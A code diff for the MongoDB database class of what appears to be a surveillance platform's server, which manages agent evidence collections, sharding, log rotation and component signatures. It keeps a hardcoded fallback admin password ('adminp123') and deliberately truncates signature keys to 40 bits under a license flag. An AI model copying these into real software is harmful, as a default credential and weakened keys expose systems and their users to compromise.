@@ -27,7 +27,6 @@ class DB
 
   def initialize
     @available = false
-    @semaphore = Mutex.new
     @auth_required = false
     @auth_user = 'root'
     @auth_pass = File.binread(Config.instance.file('mongodb.key')) if File.exist?(Config.instance.file('mongodb.key'))
@@ -38,11 +37,15 @@ class DB
       # this is required for mongoid >= 2.4.2
       ENV['MONGOID_ENV'] = 'yes'
 
-      Mongoid.load!(Dir.pwd + '/config/mongoid.yaml')
       Mongoid.configure do |config|
         config.master = Mongo::Connection.new(Config.instance.global['CN'], 27017, pool_size: 50, pool_timeout: 15).db('rcs')
         config.persist_in_safe_mode = true
+        #config.raise_not_found_error = false
+        #config.logger = ::Logger.new($stdout)
       end
+
+      #puts Mongoid.config.settings.inspect
+
       trace :info, "Connected to MongoDB"
 
       # check if we need to authenticate
@@ -70,7 +73,7 @@ class DB
       trace :warn, "AUTH: #{e.message}"
     end
     delta = Time.now - time
-    trace :warn, "Opening new connection is too slow (%f), check name resolution" % delta if delta > 0.5
+    trace :warn, "Opening new connection is too slow (%f)" % delta if delta > 0.5 and Config.instance.global['PERF']
     return db
   rescue Mongo::AuthenticationError => e
     trace :fatal, "AUTH: #{e.message}"
@@ -103,9 +106,14 @@ class DB
   def create_indexes
     db = DB.instance.new_connection("rcs")
 
+    trace :info, "Database size is: " + db.stats['dataSize'].to_s_bytes
+
+    trace :info, "Ensuring indexing on collections..."
+
     @@classes_to_be_indexed.each do |k|
       # get the metadata of the collection
       coll = db.collection(k.collection_name)
+
       # skip if already indexed
       begin
         next if coll.stats['nindexes'] > 1
@@ -115,6 +123,27 @@ class DB
       trace :info, "Creating indexes for #{k.collection_name}"
       k.create_indexes
     end
+
+    # ensure indexes on every evidence collection
+    collections = Mongoid::Config.master.collection_names
+    collections.keep_if {|x| x['evidence.']}
+    collections.delete_if {|x| x['grid.'] or x['files'] or x['chunks']}
+
+    trace :debug, "Indexing #{collections.size} collections"
+
+    collections.each do |coll_name|
+      coll = db.collection(coll_name)
+      e = Evidence.collection_class(coll_name.split('.').last)
+      # number of index + _id + shard_key
+      next if coll.stats['nindexes'] == e.index_options.size + 2
+      trace :info, "Creating indexes for #{coll_name} - " + coll.stats['size'].to_s_bytes
+      e.create_indexes
+      Shard.set_key(coll, {type: 1, da: 1, aid: 1})
+    end
+
+    # index on shard id for the worker
+    coll = db.collection('grid.evidence.files')
+    coll.create_index('metadata.shard')
   end
 
   def enable_sharding
@@ -129,7 +158,7 @@ class DB
 
   def shard_audit
     # enable shard on audit log, it will increase its size forever and ever
-    db = Mongoid.database
+    db = DB.instance.new_connection("rcs")
     audit = db.collection('audit')
     Shard.set_key(audit, {time: 1, actor: 1}) unless audit.stats['sharded']
   end
@@ -141,7 +170,13 @@ class DB
       trace :warn, "No ADMIN found, creating a default admin user..."
       User.where(name: 'admin').delete_all
       user = User.create(name: 'admin') do |u|
-        u[:pass] = u.create_password('adminp123')
+        if File.exist? Config.instance.file('admin_pass')
+          pass = File.read(Config.instance.file('admin_pass'))
+          FileUtils.rm_rf Config.instance.file('admin_pass')
+        else
+          pass = 'adminp123'
+        end
+        u[:pass] = u.create_password(pass)
         u[:enabled] = true
         u[:desc] = 'Default admin user'
         u[:privs] = ['ADMIN', 'SYS', 'TECH', 'VIEW']
@@ -160,10 +195,29 @@ class DB
   def ensure_signatures
     if Signature.count == 0
       trace :warn, "No Signature found, creating them..."
-      Signature.create(scope: 'agent') { |s| s.value = SecureRandom.hex(16) }
-      Signature.create(scope: 'collector') { |s| s.value = SecureRandom.hex(16) }
-      Signature.create(scope: 'network') { |s| s.value = SecureRandom.hex(16) }
-      Signature.create(scope: 'server') { |s| s.value = SecureRandom.hex(16) }
+
+      # NOTE about the key space:
+      # the length of the key is 32 chars based on an alphabet of 16 combination (hex digits)
+      # so the combinations are 16^32 that is 2^128 bits
+      # if the license contains the flag to lower the encryption bits we have to
+      # cap this to 2^40 so we can cut the key to 10 chars that is 16^10 == 2^40 bits
+
+      Signature.create(scope: 'agent') do |s|
+        s.value = SecureRandom.hex(16)
+        s.value[10..-1] = "0" * (s.value.length - 10) if LicenseManager.instance.limits[:encbits]
+      end
+      Signature.create(scope: 'collector') do |s|
+        s.value = SecureRandom.hex(16)
+        s.value[10..-1] = "0" * (s.value.length - 10) if LicenseManager.instance.limits[:encbits]
+      end
+      Signature.create(scope: 'network') do |s|
+        s.value = SecureRandom.hex(16)
+        s.value[10..-1] = "0" * (s.value.length - 10) if LicenseManager.instance.limits[:encbits]
+      end
+      Signature.create(scope: 'server') do |s|
+        s.value = SecureRandom.hex(16)
+        s.value[10..-1] = "0" * (s.value.length - 10) if LicenseManager.instance.limits[:encbits]
+      end
     end
     # dump the signature for NIA, Anon etc to a file
     File.open(Config.instance.cert('rcs-network.sig'), 'wb') {|f| f.write Signature.where(scope: 'network').first.value}
@@ -191,9 +245,40 @@ class DB
     trace :error, "Cannot modify the host file: #{e.message}"
   end
 
+  def logrotate
+
+    # perform the log rotation only at midnight
+    time = Time.now
+    return unless time.hour == 0 and time.min == 0
+
+    trace :info, "Log Rotation"
+
+    db = Mongo::Connection.new(Config.instance.global['CN'], 27017).db('admin')
+    db.command({ logRotate: 1 })
+
+    db = Mongo::Connection.new(Config.instance.global['CN'], 27018).db('admin')
+    db.command({ logRotate: 1 })
+
+    db = Mongo::Connection.new(Config.instance.global['CN'], 27019).db('admin')
+    db.command({ logRotate: 1 })
+  end
+
   def create_evidence_filters
     trace :debug, "Creating default evidence filters"
     ::EvidenceFilter.create_default
+  end
+
+  def clean_capped_logs
+    # drop all the temporary capped logs collections
+    collections = Mongoid::Config.master.collection_names
+    collections.keep_if {|x| x['logs.']}
+
+    db = DB.instance.new_connection("rcs")
+
+    collections.each do |coll_name|
+      trace :debug, "Dropping: #{coll_name}"
+      db.collection(coll_name).drop
+    end
   end
 
 end
